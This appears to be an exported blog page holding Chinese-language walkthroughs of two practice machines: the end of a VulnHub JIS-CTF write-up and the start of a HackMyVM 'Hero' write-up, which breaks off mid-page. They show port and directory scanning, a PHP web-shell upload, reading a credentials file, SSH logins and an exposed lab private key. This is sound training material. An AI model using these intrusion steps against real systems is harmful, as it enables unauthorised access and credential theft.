bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.5 -oA nmapscan/vuln          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:24 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00094s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.5</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.5:80/</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|_    Form action: check_login.php</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /admin_area/: Possible admin folder</span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|   /admin_area/index.php: Possible admin folder</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 334.73 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502061734755.png"></p><p>（2）使用<code>gobuster</code>进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.5<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 302) [Size: 1228] [--&gt; login.php]<br>/.php                 (Status: 403) [Size: 290]<br>/.html                (Status: 403) [Size: 291]<br>/login.php            (Status: 200) [Size: 1485]<br>/assets               (Status: 301) [Size: 311] [--&gt; http://192.168.2.5/assets/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://192.168.2.5/css/]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://192.168.2.5/js/]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]<br>/flag                 (Status: 301) [Size: 309] [--&gt; http://192.168.2.5/flag/]<br>/flag.txt             (Status: 403) [Size: 294]<br>/robots.txt           (Status: 200) [Size: 160]<br>/.php                 (Status: 403) [Size: 290]<br>/.html                (Status: 403) [Size: 291]<br>/uploaded_files       (Status: 301) [Size: 319] [--&gt; http://192.168.2.5/uploaded_files/]                                                                          <br>/hint.txt             (Status: 200) [Size: 145]<br>/server-status        (Status: 403) [Size: 299]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（3）尝试访问<code>flag</code>文件，找到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">The 1st flag is : &#123;8734509128730458630012095&#125;<br></code></pre></td></tr></table></figure><p>（4）尝试访问<code>robots.txt</code>文件，找到以下的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-agent: *<br>Disallow: /<br>Disallow: /backup<br>Disallow: /admin<br>Disallow: /admin_area<br>Disallow: /r00t<br>Disallow: /uploads<br>Disallow: /uploaded_files<br>Disallow: /flag<br></code></pre></td></tr></table></figure><ul><li>依次对路径进行访问，发现<code>admin_area</code>可以进行访问，查看页面源码，找到第二个flag</li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">Fake admin area :)</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>The admin area not work :) <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--username : admin</span></span><br><span class="hljs-comment"><span class="language-xml">password : 3v1l_H@ck3r</span></span><br><span class="hljs-comment"><span class="language-xml">The 2nd flag is : </span></span><span class="hljs-template-variable">&#123;7412574125871236547895214&#125;</span><span class="language-xml"><span class="hljs-comment"></span></span><br><span class="hljs-comment"><span class="language-xml">--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><ul><li>使用注释里面的<code>username</code>和<code>password</code>进行登录，成功进行登录，发现是一个文件上传页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502061753042.png"></li><li>进行文件上传测试<br>直接上传一个PHP后门文件，发现上传成功，需要找到文件上传后的目录，访问<code>/robots.txt</code>，在里面找到了文件上传后保存的目录为<code>uploded_files</code><br>使用<code>哥斯拉Godzilla</code>连接网站，成功进入网站<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062206022.png"></li></ul><p>找到<code>flag.txt</code>，访问提示权限不够<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062208624.png"></p><p>（5）尝试访问<code>hint.txt</code>文件，找到第三个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">try to find user technawi password to <span class="hljs-built_in">read</span> the flag.txt file, you can find it <span class="hljs-keyword">in</span> a hidden file ;)<br><br>The 3rd flag is : &#123;7645110034526579012345670&#125;<br></code></pre></td></tr></table></figure><p>（6）根据<code>hint.txt</code>的提示，需要找到用户<code>technawi</code>的密码去读取<code>flag.txt</code><br>尝试搜索用户名<code>technawi</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user <span class="hljs-string">&#x27;technawi&#x27;</span> 2&gt;/dev/null<br><span class="hljs-comment">#命令“2&gt;/dev/null”表示过滤掉类似没有权限的信息</span><br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502062211504.png"><br>找到一个数据库的配置文件，尝试去读取，找到第四个flag和用户<code>technawi</code>的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/var/www/html/uploaded_files/ &gt;<span class="hljs-built_in">cat</span> /etc/mysql/conf.d/credentials.txt<br><br>The 4th flag is : &#123;7845658974123568974185412&#125;<br><br>username : technawi<br>password : 3vilH@ksor<br></code></pre></td></tr></table></figure><h1 id="提权-ssh"><a href="#提权-ssh" class="headerlink" title="提权-ssh"></a>提权-ssh</h1><p>（1）根据<code>hint.txt</code>的提示，需要以用户<code>technawi</code>的权限去读取<code>flag.txt</code>，同时靶机开放<code>22</code>端口，尝试进行ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/]<br>└─$ ssh technawi@192.168.2.5<br>technawi@192.168.2.5<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-72-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 packages can be updated.</span><br><span class="hljs-string">0 updates are security updates.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Fri Apr 21 17:22:16 2017</span><br></code></pre></td></tr></table></figure><p>（2）成功以用户<code>technawi</code>进行登录，去读取文件<code>flag.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">technawi@Jordaninfosec-CTF01:~$ <span class="hljs-built_in">cat</span> /var/www/html/flag.txt<br>The 5th flag is : &#123;5473215946785213456975249&#125;<br><br>Good job :)<br><br>You find 5 flags and got their points and finish the first scenario....<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要考查文件上传和ssh提权，比较简单，需要注重细节，不能放过任何一个路径</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hero</title>
    <link href="/hackmyvm/Hero/"/>
    <url>/hackmyvm/Hero/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=Hero">https://hackmyvm.eu/machines/machine.php?vm=Hero</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:09 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00015s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00019s latency).<br>MAC Address: 08:00:27:40:3A:6A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00065s latency).<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.03 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.9 -oA nmapscan/ports               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.0050s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>5678/tcp open  rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.92 seconds<br></code></pre></td></tr></table></figure><p>开放端口80 和5678<br>（2）对端口细节进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p80,5678 192.168.2.9 -oA nmapscan/detail  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    nginx<br>5678/tcp open  rrac?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5678-TCP:V=7.94SVN%I=7%D=2/7%Time=67A606D3%P=x86_64-pc-linux-gnu%r(<br>SF:GetRequest,8DC,HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCa<br>SF:che-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x200<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.75 seconds<br><br></code></pre></td></tr></table></figure><p>（3）进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p80,5678 192.168.2.9 -oA nmapscan/udp  <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00057s latency).<br><br>PORT     STATE  SERVICE<br>80/udp   closed http<br>5678/udp closed rrac<br>MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.21 seconds<br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,5678 192.168.2.9 -oA nmapscan/vuln         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 21:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00030s latency).<br><br>PORT     STATE  SERVICE<br>22/tcp   closed ssh<br>80/tcp   open   http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-vuln-cve2011-3192: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Apache byterange filter DoS</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="hljs-string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="hljs-string">|       overlapping byte ranges are requested.</span><br><span class="hljs-string">|     Disclosure date: 2011-08-19</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/49303</span><br><span class="hljs-string">|_      https://www.tenable.com/plugins/nessus/55976</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">5678/tcp open   rrac</span><br><span class="hljs-string">MAC Address: 08:00:27:D2:3D:FB (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 73.60 seconds</span><br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是<code>ssh</code>的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L<br>UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg<br>AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75<br>BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ul><li>将私钥保存到文件<code>id_rsa</code>中<br>（2）从私钥中提取公钥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ ssh-keygen -y -f id_rsa             <br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero<br></code></pre></td></tr></table></figure></li><li>找到ssh登录的用户名是<code>shawa</code><br>（3）对80端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 399]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现其他的目录，渗透基本结束</li></ul><h2 id="5678端口渗透"><a href="#5678端口渗透" class="headerlink" title="5678端口渗透"></a>5678端口渗透</h2><p>（1）访问页面发现是<code>n8n</code>，一个工作流自动化平台，按照提示进行注册和登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502072146175.png"></p><ul><li>成功进入页面<br>（2）对5678端口进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/hmv/hero]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9:5678 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.9:5678<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 1975]<br>/static               (Status: 301) [Size: 156] [--&gt; /static/]<br>/assets               (Status: 301) [Size: 156] [--&gt; /assets/]<br>/types                (Status: 301) [Size: 155] [--&gt; /types/]<br>Progress: 650365 / 830576 (78.30%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 650454 / 830576 (78.31%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure></li><li>未发现有用的目录</li></ul><h2 id="n8n渗透"><a href="#n8n渗透" class="headerlink" 